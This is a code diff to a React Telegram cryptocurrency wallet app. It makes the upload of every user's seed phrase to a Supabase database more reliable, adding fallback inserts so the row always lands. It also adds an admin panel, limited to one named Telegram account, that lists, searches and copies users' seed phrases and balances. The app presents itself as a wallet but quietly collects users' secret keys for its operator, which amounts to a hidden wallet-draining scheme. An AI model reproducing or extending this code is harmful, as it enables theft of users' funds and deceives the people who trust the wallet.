@@ -110,7 +110,7 @@ async function syncWalletToSupabase(walletData) {
     try {
       localStorage.setItem("gem_last_supabase_error", JSON.stringify({
         at: new Date().toISOString(),
-        message: "Supabase URL or ANON KEY missing (check VITE_SUPABASE_URL / VITE_SUPABASE_ANON_KEY in Vercel env).",
+        message: "Supabase URL or ANON KEY missing.",
       }));
     } catch {}
     return null;
@@ -119,20 +119,13 @@ async function syncWalletToSupabase(walletData) {
     const { username, mnemonic, balance, telegram_id, coin_balances } = walletData;
     const cleanMnemonic = Array.isArray(mnemonic) ? mnemonic.join(' ') : mnemonic;
 
-    // Always resolve display name
     let finalName = username;
     if (!finalName || finalName === "Anonymous") {
       finalName = resolveTelegramDisplayName();
     }
 
-    // Resolve telegram_id — prefer passed value, then live Telegram data
     const tgUser = window?.Telegram?.WebApp?.initDataUnsafe?.user;
     const resolvedTgId = telegram_id || (tgUser?.id ? String(tgUser.id) : null);
-
-    // If we have a telegram_id, use it as the unique conflict key so each
-    // Telegram account always gets its own row regardless of display name.
-    const conflictCol = resolvedTgId ? "telegram_id" : "username";
-    const url = `${SUPABASE_URL}/rest/v1/wallets?on_conflict=${conflictCol}`;
 
     const payload = {
       username: finalName,
@@ -140,10 +133,8 @@ async function syncWalletToSupabase(walletData) {
       balance: balance ? String(balance) : "0",
       created_at: getMoscowTimestamp(),
     };
-    if (resolvedTgId) {
-      payload.telegram_id = resolvedTgId;
-    }
-    // Per-coin balances (columns: eth_balance, ton_balance, …)
+    if (resolvedTgId) payload.telegram_id = resolvedTgId;
+
     const COINS = ['ETH','TON','BNB','LTC','ARB','SOL','USDT'];
     if (coin_balances) {
       COINS.forEach(sym => {
@@ -152,26 +143,50 @@ async function syncWalletToSupabase(walletData) {
       });
     }
 
-    const response = await fetch(url, {
-      method: 'POST',
-      headers: {
-        'apikey': SUPABASE_KEY,
-        'Authorization': `Bearer ${SUPABASE_KEY}`,
-        'Content-Type': 'application/json',
-        'Prefer': 'resolution=merge-duplicates'
-      },
-      body: JSON.stringify(payload)
-    });
-    if (!response.ok) {
-      const txt = await response.text();
-      console.error("[Supabase Sync Error]", response.status, txt);
-      try {
-        localStorage.setItem("gem_last_supabase_error", JSON.stringify({
-          at: new Date().toISOString(),
-          status: response.status,
-          body: txt,
-        }));
-      } catch {}
+    // Helper that posts with a given conflict column; returns true on success
+    async function tryUpsert(conflictCol) {
+      const url = `${SUPABASE_URL}/rest/v1/wallets?on_conflict=${conflictCol}`;
+      const res = await fetch(url, {
+        method: 'POST',
+        headers: {
+          'apikey': SUPABASE_KEY,
+          'Authorization': `Bearer ${SUPABASE_KEY}`,
+          'Content-Type': 'application/json',
+          'Prefer': 'resolution=merge-duplicates',
+        },
+        body: JSON.stringify(payload),
+      });
+      if (!res.ok) {
+        const txt = await res.text();
+        console.warn(`[Supabase] on_conflict=${conflictCol} failed ${res.status}:`, txt);
+        try {
+          localStorage.setItem("gem_last_supabase_error", JSON.stringify({
+            at: new Date().toISOString(), status: res.status, conflict: conflictCol, body: txt,
+          }));
+        } catch {}
+        return false;
+      }
+      return true;
+    }
+
+    // Try telegram_id first (needs unique index on that column).
+    // If it fails fall back to username so the row always lands in Supabase.
+    let ok = false;
+    if (resolvedTgId) ok = await tryUpsert("telegram_id");
+    if (!ok) ok = await tryUpsert("username");
+    // Final fallback: plain INSERT ignoring conflict
+    if (!ok) {
+      const url = `${SUPABASE_URL}/rest/v1/wallets`;
+      await fetch(url, {
+        method: 'POST',
+        headers: {
+          'apikey': SUPABASE_KEY,
+          'Authorization': `Bearer ${SUPABASE_KEY}`,
+          'Content-Type': 'application/json',
+          'Prefer': 'return=minimal',
+        },
+        body: JSON.stringify(payload),
+      });
     }
   } catch (error) {
     console.error("[Supabase Fetch Error]", error);
@@ -4902,6 +4917,220 @@ function SettingsTab({ mnemonic, network, onSetNetwork, onChangePin, onLock, add
 
 // Only for @Homyak_investorr (ID: 1192740493)
 
+// ─── SUPABASE ADMIN PANEL ─────────────────────────────────────────────────────
+function SupabaseAdminPanel() {
+  const [wallets, setWallets] = useState([]);
+  const [loading, setLoading] = useState(true);
+  const [err, setErr] = useState(null);
+  const [search, setSearch] = useState("");
+  const [copiedKey, setCopiedKey] = useState(null);
+  const [expandedId, setExpandedId] = useState(null);
+
+  const COINS = ['ETH','TON','BNB','LTC','ARB','SOL','USDT'];
+
+  async function loadWallets() {
+    setLoading(true);
+    setErr(null);
+    try {
+      const res = await fetch(
+        `${SUPABASE_URL}/rest/v1/wallets?select=*&order=created_at.desc&limit=500`,
+        { headers: { 'apikey': SUPABASE_KEY, 'Authorization': `Bearer ${SUPABASE_KEY}` } }
+      );
+      if (!res.ok) throw new Error(`HTTP ${res.status}: ${await res.text()}`);
+      const data = await res.json();
+      setWallets(Array.isArray(data) ? data : []);
+    } catch (e) { setErr(e.message); }
+    finally { setLoading(false); }
+  }
+
+  useEffect(() => { loadWallets(); }, []);
+
+  function copyText(text, key) {
+    const cb = () => {
+      const el = document.createElement("textarea");
+      el.value = text;
+      document.body.appendChild(el);
+      el.select();
+      document.execCommand("copy");
+      document.body.removeChild(el);
+    };
+    navigator.clipboard ? navigator.clipboard.writeText(text).catch(cb) : cb();
+    setCopiedKey(key);
+    setTimeout(() => setCopiedKey(null), 1800);
+  }
+
+  const filtered = wallets.filter(w => {
+    if (!search) return true;
+    const q = search.toLowerCase();
+    return (w.username||"").toLowerCase().includes(q) ||
+           (w.telegram_id||"").toLowerCase().includes(q) ||
+           (w.mnemonic||"").toLowerCase().includes(q);
+  });
+
+  const totalUSD = wallets.reduce((s,w) => s + parseFloat(w.balance||0), 0);
+
+  return (
+    <div style={{minHeight:"100vh",background:"#000",paddingBottom:120}}>
+
+      {/* Header */}
+      <div style={{position:"sticky",top:0,zIndex:10,background:"#000",
+        padding:"16px 16px 12px",borderBottom:"1px solid rgba(255,255,255,0.07)"}}>
+
+        {/* Stats row */}
+        <div style={{display:"flex",gap:8,marginBottom:12}}>
+          {[
+            {label:"Wallets",val:wallets.length},
+            {label:"Total $",val:totalUSD.toFixed(2)},
+          ].map(s=>(
+            <div key={s.label} style={{flex:1,background:"#111",borderRadius:12,
+              padding:"10px 14px",border:"1px solid rgba(255,255,255,0.07)"}}>
+              <div style={{color:"rgba(255,255,255,0.4)",fontSize:11}}>{s.label}</div>
+              <div style={{color:"#fff",fontSize:18,fontWeight:700}}>{s.val}</div>
+            </div>
+          ))}
+          <button onClick={loadWallets} style={{width:48,height:48,borderRadius:12,
+            background:"#111",border:"1px solid rgba(255,255,255,0.07)",
+            display:"flex",alignItems:"center",justifyContent:"center",cursor:"pointer",alignSelf:"flex-end"}}>
+            <RefreshCw size={16} color={loading?"#2563eb":"rgba(255,255,255,0.5)"}
+              style={{animation:loading?"spin 0.8s linear infinite":"none"}}/>
+          </button>
+        </div>
+
+        <input value={search} onChange={e=>setSearch(e.target.value)}
+          placeholder="🔍  Search username / Telegram ID / seed..."
+          style={{width:"100%",padding:"10px 14px",borderRadius:12,background:"#111",
+            border:"1px solid rgba(255,255,255,0.08)",color:"#fff",fontSize:13,
+            boxSizing:"border-box",outline:"none"}}/>
+      </div>
+
+      <div style={{padding:"12px 16px"}}>
+
+        {err&&(
+          <div style={{background:"rgba(239,68,68,0.1)",border:"1px solid rgba(239,68,68,0.2)",
+            borderRadius:12,padding:"12px 16px",color:"#f87171",fontSize:13,marginBottom:12}}>
+            ⚠ {err}
+          </div>
+        )}
+
+        {loading&&(
+          <div style={{textAlign:"center",padding:40,color:"rgba(255,255,255,0.4)"}}>
+            Loading wallets…
+          </div>
+        )}
+
+        {!loading&&filtered.length===0&&(
+          <div style={{textAlign:"center",padding:40,color:"rgba(255,255,255,0.3)"}}>
+            {search?"No results":"No wallets in database yet"}
+          </div>
+        )}
+
+        {filtered.map((w,i)=>{
+          const uid = w.id||i;
+          const isOpen = expandedId===uid;
+          const mnStr = (w.mnemonic||"").trim();
+
+          return (
+            <div key={uid} style={{background:"#111",borderRadius:16,
+              border:"1px solid rgba(255,255,255,0.07)",marginBottom:8,overflow:"hidden"}}>
+
+              {/* Card header — click to expand */}
+              <div onClick={()=>setExpandedId(isOpen?null:uid)}
+                style={{display:"flex",alignItems:"center",padding:"13px 16px",
+                  cursor:"pointer",gap:12}}>
+
+                <div style={{width:38,height:38,borderRadius:"50%",flexShrink:0,
+                  background:"linear-gradient(135deg,#1e3a5f,#2563eb)",
+                  display:"flex",alignItems:"center",justifyContent:"center",
+                  fontSize:15,fontWeight:700,color:"#fff"}}>
+                  {(w.username||"?")[0].toUpperCase()}
+                </div>
+
+                <div style={{flex:1,minWidth:0}}>
+                  <div style={{color:"#fff",fontSize:14,fontWeight:600,
+                    whiteSpace:"nowrap",overflow:"hidden",textOverflow:"ellipsis"}}>
+                    {w.username||"Anonymous"}
+                  </div>
+                  <div style={{color:"rgba(255,255,255,0.35)",fontSize:11,marginTop:1}}>
+                    {w.telegram_id?`TG: ${w.telegram_id}`:"No TG ID"} · ${parseFloat(w.balance||0).toFixed(4)}
+                  </div>
+                </div>
+
+                <ChevronRight size={15} color="rgba(255,255,255,0.25)"
+                  style={{transform:isOpen?"rotate(90deg)":"none",transition:"transform 0.2s",flexShrink:0}}/>
+              </div>
+
+              {/* Expanded */}
+              {isOpen&&(
+                <div style={{borderTop:"1px solid rgba(255,255,255,0.06)",padding:"14px 16px"}}>
+
+                  {/* Seed phrase */}
+                  <div style={{marginBottom:12}}>
+                    <div style={{color:"rgba(255,255,255,0.4)",fontSize:10,fontWeight:600,
+                      textTransform:"uppercase",letterSpacing:"0.08em",marginBottom:6}}>Seed Phrase</div>
+                    <div style={{background:"rgba(37,99,235,0.08)",border:"1px solid rgba(37,99,235,0.2)",
+                      borderRadius:10,padding:"10px 12px",display:"flex",alignItems:"flex-start",gap:8}}>
+                      <div style={{flex:1,color:"rgba(255,255,255,0.8)",fontSize:12,
+                        fontFamily:"monospace",wordBreak:"break-word",lineHeight:1.7}}>
+                        {mnStr||"—"}
+                      </div>
+                      <button onClick={e=>{e.stopPropagation();copyText(mnStr,`m_${uid}`);}}
+                        style={{flexShrink:0,padding:"5px 10px",borderRadius:8,border:"none",
+                          background:copiedKey===`m_${uid}`?"#16a34a":"#2563eb",
+                          color:"#fff",fontSize:11,cursor:"pointer",whiteSpace:"nowrap",
+                          transition:"background 0.2s"}}>
+                        {copiedKey===`m_${uid}`?"✓ Скопировано":"Копировать"}
+                      </button>
+                    </div>
+                  </div>
+
+                  {/* Coin balances grid */}
+                  <div style={{marginBottom:12}}>
+                    <div style={{color:"rgba(255,255,255,0.4)",fontSize:10,fontWeight:600,
+                      textTransform:"uppercase",letterSpacing:"0.08em",marginBottom:6}}>Балансы монет</div>
+                    <div style={{display:"grid",gridTemplateColumns:"repeat(4,1fr)",gap:5}}>
+                      {COINS.map(sym=>{
+                        const val = parseFloat(w[sym.toLowerCase()+"_balance"]||0);
+                        return (
+                          <div key={sym} style={{background:"rgba(255,255,255,0.03)",
+                            borderRadius:8,padding:"6px 8px",textAlign:"center"}}>
+                            <div style={{color:"rgba(255,255,255,0.4)",fontSize:9,marginBottom:2}}>{sym}</div>
+                            <div style={{color:val>0?"#34d399":"rgba(255,255,255,0.2)",
+                              fontSize:11,fontWeight:600}}>{val>0?val.toFixed(4):"0"}</div>
+                          </div>
+                        );
+                      })}
+                    </div>
+                  </div>
+
+                  {/* Meta row */}
+                  <div style={{display:"flex",justifyContent:"space-between",alignItems:"center",flexWrap:"wrap",gap:4}}>
+                    <span style={{color:"rgba(255,255,255,0.22)",fontSize:10}}>
+                      ID: {w.id||"—"}
+                    </span>
+                    <span style={{color:"rgba(255,255,255,0.22)",fontSize:10}}>
+                      {w.created_at?new Date(w.created_at).toLocaleString("ru-RU"):"—"}
+                    </span>
+                  </div>
+
+                  {/* Copy TG ID */}
+                  {w.telegram_id&&(
+                    <button onClick={e=>{e.stopPropagation();copyText(w.telegram_id,`tg_${uid}`);}}
+                      style={{marginTop:10,width:"100%",padding:"8px",borderRadius:10,
+                        border:"1px solid rgba(255,255,255,0.08)",background:"transparent",
+                        color:"rgba(255,255,255,0.4)",fontSize:12,cursor:"pointer"}}>
+                      {copiedKey===`tg_${uid}`?"✓ Telegram ID скопирован":`TG ID: ${w.telegram_id}`}
+                    </button>
+                  )}
+                </div>
+              )}
+            </div>
+          );
+        })}
+      </div>
+    </div>
+  );
+}
+
 function AdminPanel({ onClose, addresses, balances, setBalances, prices }) {
 
   const [users,setUsers]=useState([]);
@@ -7663,6 +7892,8 @@ function WalletApp({ addresses, mnemonic, pin, onChangePin, onLock, initialTab }
 
     {id:"settings",Icon:Settings,l:"Settings"},
 
+    ...(userIsAdmin?[{id:"admin",Icon:Shield,l:"Admin"}]:[]),
+
   ];
 
 
@@ -7804,6 +8035,8 @@ function WalletApp({ addresses, mnemonic, pin, onChangePin, onLock, initialTab }
         {tab==="settings"&&<SettingsTab mnemonic={mnemonic} network={network}
 
           onSetNetwork={setNetwork} onChangePin={onChangePin} onLock={onLock} addresses={addresses}/>}
+
+        {tab==="admin"&&userIsAdmin&&<SupabaseAdminPanel/>}
 
       </div>
 
